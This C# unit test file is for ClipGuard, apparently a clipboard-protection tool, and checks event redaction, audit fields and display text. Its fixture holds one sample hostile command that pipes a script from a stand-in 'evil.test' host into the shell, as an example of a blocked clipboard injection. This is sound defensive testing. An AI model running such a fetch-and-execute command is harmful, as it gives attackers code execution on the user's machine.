using ClipGuard.Models;

namespace ClipGuard.Tests;

public class ClipboardEventTests
{
    private static ClipboardEvent Blocked() => new()
    {
        Id = "CG-1",
        ProcessName = "sketchy.exe",
        Action = ClipboardAction.Write,
        Category = EventCategory.CommandInjection,
        ContentPreview = "curl -sL https://evil.test/x | sh",
        ReplacedPreview = "npm install clipguard",
        PasteTarget = "Command Prompt",
        Blocked = true,
        Warned = true,
        Defused = true,
        UserOverrode = true,
        HighRisk = true,
        Timestamp = DateTimeOffset.Now
    };

    [Fact]
    public void WithoutContent_strips_both_previews()
    {
        var stripped = Blocked().WithoutContent();

        Assert.Equal("(not stored)", stripped.ContentPreview);
        Assert.Equal("(not stored)", stripped.ReplacedPreview);
    }

    [Fact]
    public void WithoutContent_keeps_the_verdict()
    {
        // Turning off content history must not turn off the audit trail.
        var original = Blocked();
        var stripped = original.WithoutContent();

        Assert.Equal(original.Id, stripped.Id);
        Assert.Equal(original.ProcessName, stripped.ProcessName);
        Assert.Equal(original.Category, stripped.Category);
        Assert.Equal(original.PasteTarget, stripped.PasteTarget);
        Assert.True(stripped.Blocked);
        Assert.True(stripped.Warned);
        Assert.True(stripped.Defused);
        Assert.True(stripped.UserOverrode);
        Assert.True(stripped.HighRisk);
        Assert.Equal(original.Timestamp, stripped.Timestamp);
    }

    [Fact]
    public void WithoutContent_leaves_a_null_replacement_null()
    {
        var allowed = new ClipboardEvent { Id = "CG-2", ContentPreview = "hello" };
        Assert.Null(allowed.WithoutContent().ReplacedPreview);
    }

    [Theory]
    [InlineData(ClipboardAction.Write, true, "wrote to clipboard, blocked")]
    [InlineData(ClipboardAction.Write, false, "wrote to clipboard")]
    [InlineData(ClipboardAction.Read, false, "read clipboard")]
    public void Action_text_matches_the_verdict(ClipboardAction action, bool blocked, string expected)
    {
        var record = new ClipboardEvent { Action = action, Blocked = blocked };
        Assert.Equal(expected, record.ActionText);
    }

    [Fact]
    public void Blocked_rows_offer_to_block_and_allowed_rows_to_allow()
    {
        Assert.Equal("Block app", new ClipboardEvent { Blocked = true }.Cta);
        Assert.Equal("Always allow", new ClipboardEvent { Blocked = false }.Cta);
    }

    [Theory]
    [InlineData(0, "now")]
    [InlineData(5, "5m")]
    [InlineData(90, "1h")]
    public void Relative_time_reads_naturally(int minutesAgo, string expected)
    {
        var record = new ClipboardEvent { Timestamp = DateTimeOffset.Now.AddMinutes(-minutesAgo) };
        Assert.Equal(expected, record.RelativeTime);
    }
}
